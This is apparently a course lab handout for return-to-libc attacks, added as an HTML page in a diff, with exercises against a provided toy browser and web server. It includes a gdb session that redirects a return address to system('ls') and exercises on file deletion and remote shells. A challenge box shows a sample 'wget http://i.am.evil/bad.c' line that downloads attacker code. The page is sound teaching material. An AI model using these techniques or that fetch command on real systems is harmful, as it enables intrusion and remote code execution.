@@ -1,0 +1,476 @@
+<html>
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Lab 2: Return-to-libc</title>
+<link rel="stylesheet" href="../labs.css" type="text/css">
+</head>
+
+<body>
+
+
+<table width="100%" >
+
+<tbody>
+  <tr>
+    <td>
+      <h1>Lab 2: Return-to-libc</h1>
+      <hr>
+
+<h3>Lab Overview</h3>
+In this lab, you'll explore how to defeat the protection
+mechanisms introduced to counter buffer overflows. The first
+type of countermeasure is non-executable stack, which will
+mark the stack memory segment, along with other segments,
+non-executable. Thus, even the shellcode jumps back to
+the stack, it has no chance to execute. To defeat this
+protection mechanism, you
+will study and use a specific technique called <i>return-to-libc</i>, a
+special and easy form of return-oriented programming. By using
+return-to-libc, shellcode can jump to any library code (or any
+executable code). 
+
+<p>
+The second type of countermeasure is memory address layout
+randomization (ASLR). The key idea of ASLR is to set random
+addresses for specific memory segments of a given process. Thus, it
+will be very difficult for an adversary to know the exact
+address of a buffer. To defeat this protection mechanism, the
+adversay can guess the starting address of a buffer and
+attack the server brute-forcely. This is rather realistic, because
+the range of the stack is relatively small.
+
+<p>
+The third type of countermeasure is a <i>canary</i>. In its simplest
+form, a
+canary is an integer on the stack (after the buffer), by checking
+whether or not a canary is altered, one can check whether or not
+the buffer is over flowed, just <i>before</i> the function
+returns. To defeat this, an adversary can just guess the
+value of the canary. At a first glance, this will be very
+hard, if not impossible, because the value space is dramatically
+huge: 2<sup>32</sup>. However, you will understand that under
+some circumstance, say a web server like Touchstone, it will be
+very practical. An adversary only need to guess just 1024 times
+to succeed.
+
+<p>
+This lab consists of three parts:
+<ul>
+  <li>Part A: you will implement a simple form of <i>Phishing</i>. By
+    planting the shellcode into to the web server, the hacker
+    can attack victims using a buggy browser;
+  </li>
+  <li>Part B: you will defeat the <i>Non-executable stack</i> 
+    protection, by using return-to-lic attack; and
+  </li>  
+  <li>Part C: you will defeat the Touchstone web server in a
+    realistic environment: the <code>ASLR</code> is enabled.
+  </li> 
+</ul>
+
+<h3>Lab Environment</h3>
+Download <a href="lab2-code.rar">this code</a>
+ to start with. In the first two parts of this lab, you will first
+disable ASLR:
+<pre>
+      $<kbd> su root</kbd>
+        Password: (enter root password)
+      # <kbd>sysctl -w kernel.randomize_va_space=0</kbd>
+</pre>
+In the third part of this lab, you'll turn on ASLR.
+
+<h1>Part A: Phishing</h1>
+Generally, <a href="https://en.wikipedia.org/wiki/Phishing">Phishing</a>
+attempts to acquire sensitive information such as username, 
+password, and credit card details (and sometimes, indirectly, money)
+by masquerading as a trustworthy entity in an electronic
+communication. In this lab, you'll design and implement a
+simple form of Phishing. Tobe specific, you (acting as
+the malicious attacker) will construct
+a web server which produces malicious HTTP responses. Thus, when
+a vitim visits your web server, the victim's browser will be
+attacked: the browser will be crashed, or the victim's computer
+will even be taken over.
+
+<div class="required">
+<p><span class="header">Exercise 1.</span>
+First, read the browser's source code, find out at least one 
+buffer overflow vulnerability. Describe briefly how this
+vulnerability can be exploited. 
+<p>
+Now read the web server's source code, locate the key code
+snippet which sends response to the browser, how can you change
+the code to crash the browser with the above vulneralibity? Implement
+your idea. Don't forget to test your code to make sure
+the malicious web server works as expected.
+</div>
+
+<p>
+Just like overflowing the web server, one can do much more
+serious attacks during phishing: say, popping up a remote
+shell, unlinking a file, stealing sensitive files, etc..
+
+<div class="required">
+<p><span class="header">Exercise 2.</span>
+Use the techniques studied in the lab 1 to attack the
+browser. The basic requirement is to unlink (delete)
+some file on the machine running the browser. Further, you
+can pop up a remote shell or open a socket, etc..
+</div>
+
+<div class="challenge">
+<p>
+<span class="header">Challenge!</span>
+The browser you've been using so far is very simple: basically, it
+can only read reponse from the web server (as a sequence of
+characters). A real-world browser tends to be more complex: besides
+reads response, it also renders html, run JavaScript engine, perfrom
+various security checking, etc.. So this means that a real-world
+browser tends to contain more vulnerabilities. So you can investigate
+how to attack real-world browsers using the knowledge you've
+learned. You can browse through the known vulnerabilities 
+on <a href="http://cve.mitre.org/" target="_blank">CVE</a>, and
+you can use some tools like
+<a href="http://www.metasploit.com/" target="_blank">
+metasploit</a> to make the work of creating shellcode simpler.
+</div>
+
+
+<h1>Part B: Non-executable Stack and Return-to-libc Attack</h1>
+To counter buffer overflows, many modern operating systems
+introduce non-executable stack by marking the stack memory
+segments non-executable. On old OS, this is achieved by setting
+up the CS segment register; and modern architecture introduce
+the NX bit in the page table to help OS manage execution
+permission. In this part of the lab, you will explore how
+this protection mechanism can be circumvented.
+
+<div class="required">
+<p><span class="header">Exercise 3.</span>
+The Ubuntu 12.04 OS you've been using in this lab has
+the non-executable stack support
+by default. To compile a C program, just use the
+<code> -z noexecstack</code> 
+option to mark the stack segment non-executable.  
+Re-compile the vulnerable program <code>stack2.c</code> 
+from lab 1:
+<pre>
+  $ <kbd>gcc -z noexecstack stack2.c</kbd>
+</pre>
+perform a buffer-overflow attack, can you succeed
+any more? What do you observe?
+</div>
+
+<p>
+The key observation to exploiting buffer overflows with a 
+non-executable stack is that even though you cannot jump to the address 
+of the overflowed buffer (it will not be executable), there's 
+usually enough code already in the vulnerable program's address space 
+to perform the operation you want.
+
+<p>
+Thus, to defeat a non-executable stack, you need to first find 
+the (binary) code you want to execute. The most straightforward way
+is often to find out a function in the 
+standard library, say libc. There are many useful functions
+in these library, such as <code>execl</code>, 
+<code>system</code>, or <code>unlink</code>, etc..
+Then, you need to arrange for the stack to look like a call to 
+that function with the desired arguments, such as <code>
+system("/bin/sh")</code>. Finally, you need to arrange for the 
+RET instruction to jump to the function you found in the first 
+step. This attack is often called a <a href="https://en.wikipedia.
+org/wiki/Return-to-libc_attack">return-to-libc attack</a>.
+
+<h3>Understand the Stack</h3>
+To know how to conduct the return-to-libc attack, it is essential to 
+understand how the stack works. We use a small C program to understand
+the effects of a function invocation on the stack.<p>
+
+<pre class="tty">
+/* foobar.c */
+#include &lt;stdio.h&gt;
+void foo(int x)
+{
+  printf("Hello world: %d\n", x);
+}
+
+int main()
+{
+  foo(1);
+  return 0;
+}
+
+We can use "gcc -S foobar.c" to compile this program to the assembly code. The 
+resulting file foobar.s will look like the following:
+
+    ......
+  8 foo:
+  9         pushl   %ebp
+ 10         movl    %esp, %ebp
+ 11         subl    $8, %esp
+ 12         movl    8(%ebp), %eax
+ 13         movl    %eax, 4(%esp)
+ 14         movl    $.LC0, (%esp)  : string "Hello world: %d\n"
+ 15         call    printf
+ 16         leave
+ 17         ret
+    ......
+ 21 main:
+ 22         leal    4(%esp), %ecx
+ 23         andl    $-16, %esp
+ 24         pushl   -4(%ecx)
+ 25         pushl   %ebp
+ 26         movl    %esp, %ebp
+ 27         pushl   %ecx
+ 28         subl    $4, %esp
+ 29         movl    $1, (%esp)
+ 30         call    foo
+ 31         movl    $0, %eax
+ 32         addl    $4, %esp
+ 33         popl    %ecx
+ 34         popl    %ebp
+ 35         leal    -4(%ecx), %esp
+ 36         ret
+</pre>
+
+<h5>Calling and Entering foo() </h5>
+Let us concentrate on the stack while calling foo(). We can ignore 
+the stack before that. Please note that line numbers instead of 
+instruction addresses are used in this explanation.
+<p>
+<div style="text-align:center">
+  <img src="./enter_leave_foo.jpg">
+</div>
+<p>
+
+Line 28-29:
+These two statements push the value 1, i.e. the argument to the 
+<code> foo() </code>, into the stack. This operation increments 
+<code>%esp</code> by four. The stack after these two statements 
+is depicted in figure(a).<p> 
+
+Line 30:
+<code> call foo </code> The statement pushes the address 
+of the next instruction that immediately follows the <code>call</code> 
+statement into the stack (i.e the return address), and then jumps
+to the code of <code>foo()</code>. The current stack is depicted in 
+figure (b).<p>
+
+Line 9-10:
+The first line of the function <code>foo()</code> pushes <code>%ebp
+</code> into the stack, to save the previous frame pointer. The second
+line lets <code>%ebp</code> point to the current frame. The current 
+stack is depicted in figure (c).<p>
+
+Line 11: 
+<code>subl $8, %esp</code> The stack pointer is modified to 
+allocate space (8 bytes) for local variables and the two 
+arguments passed to <code>printf</code>. Since there is no 
+local variable in function <code>foo</code>, the 8 bytes are 
+for arguments only. See figure (d)<p>
+
+<h5>Leaving foo()</h5>
+ 
+Now the control has passed to the function <code>foo()</code>. 
+Let us see what happens to the stack when the function returns.
+
+<p>
+
+Line 16: 
+<code>leave</code> This instruction implicitly performs two 
+instructions (it was a macro in earlier x86 releases, but was 
+made into an instruction later):
+<PRE CLASS="verbatim">    
+  mov  %ebp, %esp
+  pop  %ebp
+</PRE>
+
+The first statement release the stack space allocated for the function;
+the second statement recover the previous frame pointer.
+The current stack is depicted in Figure(e).
+
+<p>
+
+Line 17: 
+<code>ret</code> This instruction simply pops the return
+address out of the stack, and then jump to the return address.
+The current stack is depicted in Figure(f).
+<p>
+
+Line 32: 
+<code>addl $4, %esp</code>Further resotre the stack by
+releasing more memories allocated for <code>foo</code>.
+As you can clearly see that the stack is now in exactly the 
+same state as it was before entering the function 
+<code>foo</code> (i.e., before line 28).
+
+<p>
+
+<h3> Smashing the Stack</h3>
+Read the virtual file <code>/proc/pid/maps</code> on your
+machine (<code>pid</code> is the process id) you can find
+and locate the key library such as 
+<code>libc-2.15.so</code>, which contains many useful functions. The 
+key function you may use to attack the target may be <code>system(),
+unlink()</code> and so on.
+
+<div class="required">
+<p><span class="header">Exercise 4.</span>
+Use gdb to smash the function stack, the C program offered you here
+is <code>exec3.c</code>. Note that, the function address at your PC may 
+be different from  mine, but just take it easy.  
+<pre>
+  $<kbd> gcc exec3.c -o exec3 -fno-stack-protector -z noexecstack -g </kbd>
+
+  $<kbd> gdb -q exec3</kbd>
+    Reading symbols from exec3...done.
+  (gdb) <kbd>b fun</kbd> 
+    Breakpoint 1 at 0x8048423: file exec3.c, line 6.
+  (gdb) <kbd>r</kbd>
+    Starting program: /home/seed/sand-box/exec3 
+
+    Breakpoint 1, fun () at exec3.c:6
+    	     printf("Return to fun!\n");
+  (gdb)<kbd> p system</kbd>
+    $1 = {<text variable, no debug info>} 0xb7e583b0 <__libc_system>
+  (gdb)<kbd> p/x $ebp+4</kbd>
+    $2 = 0xbffff3cc
+  (gdb)<kbd> set *0xbffff3cc=0xb7e583b0</kbd>
+  (gdb)<kbd> p/x $ebp+16</kbd>
+    $3 = 0xbffff3d8
+  (gdb)<kbd> set *0xbffff3d8=0x736c</kbd>
+  (gdb)<kbd> x/s 0xbffff3d8</kbd>
+    0xbffff3d8:	"ls"
+  (gdb)<kbd> p/x $ebp+12</kbd>
+    $4 = 0xbffff3d4
+  (gdb)<kbd> set *0xbffff3d4=0xbffff3d8</kbd>
+  (gdb)<kbd> c</kbd>
+    Continuing.
+  Return to fun!
+  exec3  exec3.c nop-overflow.c	stack1.c  stack.c  test.c  x
+
+  Program received signal SIGSEGV, Segmentation fault.
+  0xbffff3d8 in ?? () 
+</pre>
+
+As you can see, the command <code>system("ls")</code>
+constructed by gdb
+runs smoothly, but not perfect. What triggered the "SIGSEG"
+fault? Modify the process memory in gdb just likeabove, to
+to let the process exit gracefully. 
+</div>
+
+<h3>Ret-to-libc Attack</h3>
+Till now, you already know how the function call stack
+is organized and how to find the library function address. So
+you can try to attack the Touchstone web server using
+ret-to-libc. 
+
+<div class="required">
+<p><span class="header">Exercise 5.</span> 
+First, compile the Touchstone webserver:
+<pre>
+  $ <kbd>make</kbd>
+  $ <kbd>./touchstone</kbd>
+</pre>
+Now, try to perform a return-to-libc attack by contructing and
+sending a malicious request containing your shellcode. Your
+shellcode can still delete a file from the web server, or can
+do something else.
+</div>
+
+<div class="challenge">
+<p><span class="header">Challenge!</span>
+The <code>system()</code> function allow one to run
+shell script, so it's very intereting to think how
+an adversary can use this function to do something useful. For
+instance, the adversary can download a C file to the webserver from
+some site by 
+<code>wget http://i.am.evil/bad.c</code>, and then compile
+this C program and run it at the 
+webserver side. In this sense, your shellcode's functionality will
+not be constrained by its size any more.
+</div>
+
+<h1>Part C: Address Space Layout Randomization</h1>
+Address space layout randomization is a technique used to
+fortify systems against buffer overflow attacks. The idea
+is to introduce artificial diversity by randomizing the
+memory location of certain system 
+components. This mechanism is available for both Linux (via PaX 
+<a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" 
+target="_blank">ASLR</a>) and OpenBSD.
+
+<h3>ASLR</h3>
+Randomizing the memory-address-space layout of software has recently 
+garnered great interest as a means of diversifying the monoculture 
+of software. It is widely believed that randomizing the address-space 
+layout of a software program prevents attackers from using the
+same exploit code effectively against all instantiations of the
+program containing the same flaw. However, as you'll do in this
+part, it's not hard to defeat ASLR, at least on 32-bit systems. 
+
+<p>
+Now, turn on the Ubuntu's address space layout randomization:
+<pre>
+       $<kbd> su root</kbd>
+         Password: (enter root password)
+       #<kbd> /sbin/sysctl -w kernel.randomize_va_space=2</kbd>
+</pre>
+<div class="required">
+<p><span class="header">Exercise 6.</span>
+After turning on the ASLR, compile the Touchstone web server:
+<pre>
+  $ <kbd>make all</kbd>
+  $ <kbd>./touchstone</kbd>
+</pre>
+try to attack the webserver using buffer overflow. Can
+you succeed? Where is the buffer's address? Is it
+exploitable?
+</div>
+
+<h3>Brute-force Attack</h3>
+To defeat ASLR, we can use the <i>Brute 
+Force</i> attack technique, which is simple but effective 
+in guessing the variable buffer address. The basic idea
+is that although we don't know the exact address of
+the buffer, however, we know its range, say, from
+<code>0x00000000</code> to <code>0xbfffffff</code>. So, by
+trying each address in turn, we'll hit the right address
+sooner or later.
+
+<div class="required">
+<p><span class="header">Exercise 7.</span>
+After turning on the ASLR, compile the Touchstone web server:
+<pre>
+  $ <kbd>make all</kbd>
+  $ <kbd>./touchstone</kbd>
+</pre>
+Send a request to the server containing the guessed address, repeating
+this process until you succeed. (Hint: think carefully the
+possible address of the buffer (hence the stack). Is every
+address between <code>0x00000000</code> to <code>0xbfffffff</code>
+possible? Is every address in the given stack a candidate for
+the buffer address? Answering these questions as precisely
+as possible will speed up your brute-force attack dramatically.)
+</div>
+ 
+<div class="challenge">
+<p>
+<span class="header">Challenge!</span>
+Turn on ASLR, enable non-executable stack, enable stack canary, and
+perform buffer overflow attack on the Touchstone web server. Do you have
+any chance to secceed? If yes, how? (We have succeeded!)
+</div>
+
+
+<h3>Handin</h3>
+This completes the lab. Remember to hand in your solution to 
+the information system.
+
+    </td>
+  </tr>
+</tbody>
+</table>
+</body>
+</html>
